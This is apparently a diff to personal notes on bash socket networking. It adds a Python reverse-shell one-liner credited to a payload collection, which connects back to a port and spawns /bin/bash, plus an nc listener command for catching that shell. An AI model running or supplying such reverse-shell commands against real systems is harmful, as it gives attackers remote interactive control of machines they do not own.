@@ -49,3 +49,10 @@ you can make some calls out like this and receive some too
 http://xmodulo.com/tcp-udp-socket-bash-shell.html
 exec {file-descriptor}<>/dev/{protocol}/{host}/{port}
 exec 3<>/dev/tcp/xmodulo.com/80
+
+decent reverse shell one liner (source https://github.com/swisskyrepo/PayloadsAllTheThings):
+python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',7003));[os.dup2(s.fileno(),i) for i in [1,2,3]];pty.spawn('/bin/bash');s.close()" 
+
+listener:
+nc -lvp 7003 
+
